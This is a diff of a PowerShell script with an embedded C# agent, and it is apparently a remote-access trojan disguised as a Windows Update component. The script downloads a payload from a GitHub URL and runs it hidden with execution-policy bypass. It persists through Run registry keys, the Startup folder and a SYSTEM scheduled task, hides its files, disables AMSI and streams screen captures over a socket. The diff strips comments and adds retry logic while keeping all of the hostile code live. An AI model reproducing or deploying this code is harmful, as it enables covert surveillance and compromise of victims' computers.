@@ -13,30 +13,25 @@ $dir = "$env:ProgramData\Microsoft\Windows\Caches"
 $scriptPath = "$dir\$installName.ps1"
 $vbsPath = "$dir\$installName.vbs"
 
-# Se for a primeira execução (tela aberta), prepara o ambiente e esconde
 if ($args -notcontains "-silent") {
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
     
-    # Cria VBS para rodar invisível (Bypass no Windows 11)
     $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
     Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
     
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     
-    # 1. Registro (HKCU e HKLM)
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 2. Pasta Startup (Copia o VBS)
     try {
         $startup = [Environment]::GetFolderPath('Startup')
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 3. Agendador de Tarefas (Roda como SYSTEM no Boot e Login)
     try {
         $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
         $trigger1 = New-ScheduledTaskTrigger -AtStartup
@@ -46,16 +41,13 @@ if ($args -notcontains "-silent") {
         Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
     
-    # Oculta os arquivos
     attrib +h +s +r $scriptPath 2>$null
     attrib +h +s +r $vbsPath 2>$null
     
-    # Inicia o modo invisível e fecha a tela
     Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
     exit
 }
 
-# ===== MODO INVISÍVEL (AGENTE C#) =====
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -133,21 +125,18 @@ if (-not ("R9KAgent" -as [type])) {
                 try {
                     if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
 
-                    // Restaura o Script PS1
                     if (!File.Exists(scriptPath)) {
                         string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                         using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
                         File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
                     
-                    // Restaura o VBS
                     if (!File.Exists(vbsPath)) {
                         string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
                         File.WriteAllText(vbsPath, vbs);
                         File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
 
-                    // Restaura o Registro
                     string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                     using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
@@ -156,7 +145,6 @@ if (-not ("R9KAgent" -as [type])) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                     }
                     
-                    // Restaura a Pasta Startup
                     string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                     string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                     if (!File.Exists(startupVbs)) {
@@ -198,10 +186,16 @@ if (-not ("R9KAgent" -as [type])) {
                         string b64 = CaptureScreen(1280, 40);
                         if (b64 != null) {
                             lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
+                        } else {
+                            // Se a captura falhar, tenta de novo no próximo ciclo
+                            Thread.Sleep(100); 
                         }
                         Thread.Sleep(30); 
                     } else { Thread.Sleep(50); }
-                } catch { Thread.Sleep(1000); }
+                } catch { 
+                    // Falha no socket ou captura, tenta novamente sem matar a thread
+                    Thread.Sleep(1000); 
+                }
             }
         }
 
